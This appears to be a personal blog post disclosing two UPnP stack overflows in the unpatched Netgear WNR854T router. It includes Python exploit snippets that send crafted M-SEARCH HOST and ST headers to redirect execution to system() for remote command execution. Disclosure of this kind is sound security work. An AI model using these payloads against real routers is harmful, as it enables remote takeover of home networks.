<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">draz.sh - Pwning My Childhood Router</title>
<meta property="og:title" content=draz.sh&#32;-&#32;Pwning&#32;My&#32;Childhood&#32;Router />
<meta name="twitter:title" content=draz.sh&#32;-&#32;Pwning&#32;My&#32;Childhood&#32;Router />
<meta itemprop="name" content=draz.sh&#32;-&#32;Pwning&#32;My&#32;Childhood&#32;Router />
<meta name="application-name" content=draz.sh&#32;-&#32;Pwning&#32;My&#32;Childhood&#32;Router />
<meta property="og:site_name" content="draz.sh" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://draz.sh/posts/pwning-childhood-router/" />
<link rel="canonical" href="https://draz.sh/posts/pwning-childhood-router/" itemprop="url" />
<meta name="url" content="https://draz.sh/posts/pwning-childhood-router/" />
<meta name="twitter:url" content="https://draz.sh/posts/pwning-childhood-router/" />
<meta property="og:url" content="https://draz.sh/posts/pwning-childhood-router/" />


<meta property="og:updated_time" content="2025-05-04T19:00:31-04:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://draz.sh/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@" />
    <meta name="twitter:creator" content="@" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="draz.sh" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.147.3">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">


    
    <style>
    body {
        --sidebar-bg-color: #101010;
        --sidebar-img-border-color: #414141;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #414141;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://draz.sh/">
                <img src="/images/skull.jpg" alt="brand image">
            </a>
        
        
            <a href="https://draz.sh/">
                <h1>draz.sh</h1>
            </a>
        
    </h1>
    <p class="lead">
    Danyaal Shaozab
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
            
                
                
            
                
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://draz.sh/posts/pwning-childhood-router/">Pwning My Childhood Router</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/draz0x7">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://linkedin.com/in/dshaozab">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>


    <a target="_blank" class="social" title="Twitter" href="https://twitter.com">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
        </svg>
    </a>







    <a target="_blank" class="social" title="YouTube" href="https://youtube.com/@DanyaalShaozab">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
            <path fill="currentColor" d="M12.006 19.012h-.02c-.062 0-6.265-.012-7.83-.437a2.5 2.5 0 0 1-1.764-1.765A26.494 26.494 0 0 1 1.986 12a26.646 26.646 0 0 1 .417-4.817A2.564 2.564 0 0 1 4.169 5.4c1.522-.4 7.554-.4 7.81-.4H12c.063 0 6.282.012 7.831.437c.859.233 1.53.904 1.762 1.763c.29 1.594.427 3.211.407 4.831a26.568 26.568 0 0 1-.418 4.811a2.51 2.51 0 0 1-1.767 1.763c-1.52.403-7.553.407-7.809.407Zm-2-10.007l-.005 6l5.212-3l-5.207-3Z"/>
        </svg>
    </a>









    <a target="_blank" class="social" title="Email" href="mailto:danyaalshaozab@gmail.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 draz.sh. All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://draz.sh/posts/pwning-childhood-router/">Pwning My Childhood Router</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-05-04T19:00:31-0400" class="post-date">
        May 4, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>4 mins read</span>
      </span>
    </div>

    
  </div>

  
  

  
</div>

  <h1 id="intro">Intro</h1>
<p>I competed in <a href="https://www.districtcon.org/2025/junkyard" target="_blank">The Junkyard</a> at DistrictCon Year 0, an end-of-life pwnathon where my group and I presented eight 0-days on the <a href="https://www.netgear.com/support/product/wnr854t/" target="_blank">Netgear WNR854T</a>. Funny enough, that was the same router my family used growing up. In this post, I&rsquo;ll walk through two memory corruption bugs we found in its UPnP service, how we discovered them, and how we got code execution.</p>
<h1 id="overflow-via-host-header-cve-2024-54802">Overflow via <code>HOST</code> Header (<a href="https://www.cve.org/CVERecord?id=CVE-2024-54802" target="_blank">CVE-2024-54802</a>)</h1>
<p>This bug is a classic stack-based buffer overflow triggered by an excessively long <code>HOST</code> header in an M-SEARCH request. The vulnerable function uses <code>strcpy</code> at offset <code>0x22bc4</code> to copy the header into a stack buffer without bounds checking:</p>
<p><img src="bof1.png" alt="alt text"></p>
<p>If an attacker sends an M-SEARCH with a ridiculously long <code>HOST</code> value, it overflows the buffer and overwrites adjacent memory on the stack, including the return address.</p>
<p>This is what a normal M-SEARCH request looks like:</p>
<pre tabindex="0"><code>M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MAN: &#34;ssdp:discover&#34;
MX: 3
ST: upnp:rootdevice
</code></pre><p>But, with an oversized <code>HOST</code> field, it would overflow the allocated buffer on the stack:</p>
<pre tabindex="0"><code>M-SEARCH * HTTP/1.1
HOST: AAAAAAAAAAAAAAAAAAAAAAAAAAAA...
MAN: &#34;ssdp:discover&#34;
MX: 3
ST: upnp:rootdevice
</code></pre><p>We crafted a malicious M-SEARCH request that overwrites the return address and redirects execution to a ROP gadget at <code>0x2d4dc</code> (<code>mov r0, r5; bl system</code>) to execute arbitrary shell commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>payload_pt1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Z&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">304</span> <span style="color:#75715e"># padding</span>
</span></span><span style="display:flex;"><span>payload_pt2 <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># R4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># R5 (command string here)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># R6</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;D&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># R7</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;E&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># R8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xdc\xd4\x02</span><span style="color:#e6db74">&#39;</span>  <span style="color:#75715e"># mov r0, r5 ; bl system</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xbeffeb20</span> <span style="color:#f92672">+</span> (len(cmd<span style="color:#f92672">.</span>encode()) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload_pt2 <span style="color:#f92672">=</span> payload_pt2<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BBBB&#39;</span>, ret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    payload_pt1 <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    payload_pt2 <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MAN:&#34;ssdp:discover&#34;</span><span style="color:#ae81ff">\r\n</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MX:2</span><span style="color:#ae81ff">\r\n</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> 
</span></span><span style="display:flex;"><span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">+</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">+</span> cmd<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>sendto(message, (host, <span style="color:#ae81ff">1900</span>))
</span></span></code></pre></div><h1 id="overflow-via-st-header-cve-2024-54809">Overflow via <code>ST</code> Header (<a href="https://www.cve.org/CVERecord?id=CVE-2024-54809" target="_blank">CVE-2024-54809</a>)</h1>
<p>Another buffer overflow, but it&rsquo;s the parsing of the <code>ST</code> header that&rsquo;s triggering the issue. The vulnerable code lives at offset <code>0x23240</code>, which is a <code>strncpy</code>, but the size parameter ends up being user-controlled since it&rsquo;s obtained arithmetically by parsing the <code>ST</code> header:</p>
<p><img src="bof2.png" alt="alt text"></p>
<p>The code looks for the <code>:device:</code> delimiter, then tries to extract the part that comes after it (<code>printer</code> in this case):</p>
<pre tabindex="0"><code>ST: uuid:schemas:device:printer
</code></pre><p>It calculates the length <code>n</code> by subtracting pointers: the start of the value (<code>first</code>) and the point just after the <code>:device:</code> tag (<code>first_after_device</code>). Then it uses <code>strncpy</code> to copy <code>n</code> bytes into a stack buffer. The problem? That <code>n</code> value is completely controlled by an attacker. There&rsquo;s no bounds check. If someone sends a value like this:</p>
<pre tabindex="0"><code>ST: uuid:schemas:device:AAAAAAAAAAAAAAAAAAAAAAAAAAAA...:
</code></pre><p>&hellip;the <code>n</code> calculation stretches all the way to the next delimiter, and if it&rsquo;s placed far away, <code>n</code> becomes massive, allowing <code>strncpy</code> to copy past the stack buffer. This parsing logic assumes the input will be nice and well-formed, but it won&rsquo;t be for a malicious request.</p>
<p>And again, we can overwrite the return address and pivot to a <code>system()</code> call:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Z&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">284</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># padding</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>    <span style="color:#75715e"># R4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>    <span style="color:#75715e"># R5 (command string here)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>    <span style="color:#75715e"># R6</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;D&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>    <span style="color:#75715e"># R7</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;E&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>    <span style="color:#75715e"># R8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xdc\xd4\x02</span><span style="color:#e6db74">&#39;</span>  <span style="color:#75715e"># mov r0, r5 ; bl system</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xbefff540</span> <span style="color:#f92672">+</span> (len(cmd<span style="color:#f92672">.</span>encode()) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BBBB&#39;</span>, ret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;M-SEARCH * HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;HOST:239.255.255.250:1900</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MAN:&#34;ssdp:discover&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MX:2</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ST:uuid:schemas:device:&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:</span><span style="color:#ae81ff">\x00\r\n\r\n</span><span style="color:#e6db74">&#39;</span> 
</span></span><span style="display:flex;"><span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">+</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">+</span> cmd<span style="color:#f92672">.</span>encode() 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>sendto(message, (host, <span style="color:#ae81ff">1900</span>))
</span></span></code></pre></div><h1 id="final-thoughts">Final Thoughts</h1>
<p>Netgear never patched this model as it&rsquo;s been end-of-life for years. But what makes these bugs even more dangerous is that the UPnP service is exposed on the WAN interface by default, meaning attackers can exploit them over the internet. And with zero memory protections on the device, reliable remote code execution is quite easy.</p>
<p>Thanks for reading! This was my first blog post 🥳</p>

  
  <hr>
<div class="footer">
    
	    
	    
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents"></nav>
    </div>
</div>

  

        </div>
    </body>
</html>
